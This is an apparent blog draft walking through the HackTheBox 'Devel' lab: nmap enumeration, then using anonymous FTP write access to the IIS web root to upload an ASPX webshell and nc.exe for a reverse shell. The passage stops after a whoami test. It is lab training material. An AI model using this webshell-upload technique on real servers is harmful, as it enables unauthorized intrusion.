---
layout: post
title:  "HackTheBox - Devel Writeup"
categories: [HackTheBox]
tags: [pentesting]
draft: true
---

# Introduction

This is a writeup for the machine "Devel" (10.10.10.5) on the platform HackTheBox. HackTheBox is a penetration testing labs platform so aspiring pen-testers & pen-testers can practice their hacking skills in a variety of different scenarios.

## Enumeration

### NMAP

As usual we're going to start off with our two nmap scans, a full TCP scan using `nmap -sV -sC -p- 10.10.10.5` and `nmap -sU -p- 10.10.10.5` in this case, we only returned ports open on TCP so we're going to look at that now.

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-21 16:59 BST
Nmap scan report for 10.10.10.5
Host is up (0.039s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

As you can see we've got two ports FTP & HTTP, FTP stands out right away because NMAP has confirmed for us that Anonymous login is allowed, that is a severe miss configuration which we can take advantage of. It even looks like the web server root is also the FTP server root, this is another sysadmin fail. We'll login to that in just a few moments, but first our web server appears to be running IIS 7.5, normally I would look for some low-hanging exploits however, given that the FTP root is the same as the web-server root, and we know that it's running ASP.NET, we're not going to go for that as I think there will be an easier path.

### FTP & HTTP

Upon logging into the FTP server we can see the same files as per the NMAP scan, and by visiting the site on HTTP we can confirm that the web root is the same as the FTP root so we're going to try and upload an ASPX shell, luckily for us there is one built into Kali.

```
ftp> put /usr/share/webshells/aspx/cmdasp.aspx cmd.aspx
local: /usr/share/webshells/aspx/cmdasp.aspx remote: cmd.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1442 bytes sent in 0.01 secs (200.5416 kB/s)
```

On port 80, let's try and visit this page and see what happens, if we look at the screenshot below, we've got a command box, that's good! That means our webshell uploaded correctly as expected.

![asp web-shell](LinxzFade.github.io\assets\images\2019-05-25-Devel\Screenshot-2019-5-25.png)

Now that we know that works, lets try and use this to execute a netcat.exe, we know that we can upload and it's going into the web root folder so this should allow us to leverage this in order to get a reverse shell on the device.

## User Exploitation

Let's put netcat.exe on the device using FTP. It's important to note that we do need to set the FTP transfer mode to binary, else netcat is not going to execute and we'll get an error when trying to execute the file. The webserver was by default using ASCII mode, in general we only want to use ASCII mode for transferring things such as text files and the like, as we're trying to execute something, we switch to binary mode. You can verify the transfer mode the server is using over FTP by using the `type` in our case we are returned `Using ascii mode to transfer files.` hence why we changed it to binary mode by typing `binary`

```
ftp> binary
200 Type set to I.
ftp> put /usr/share/windows-binaries/nc.exe nc.exe
local: /usr/share/windows-binaries/nc.exe remote: nc.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
59392 bytes sent in 0.09 secs (639.0480 kB/s)
```

We didn't actually test our webshell yet so let's run a simple `whoami` in the shell and press execute, as you can see in the below screenshot `iis apppool\web` is returned so we know that our webshell for sure works and we know that the webserver is not running as system at least (that'd be a major sysadmin fail).

![asp webshell execution](LinxzFade.github.io/assets/images/2019-05-25-Devel/webshell-execution.png)

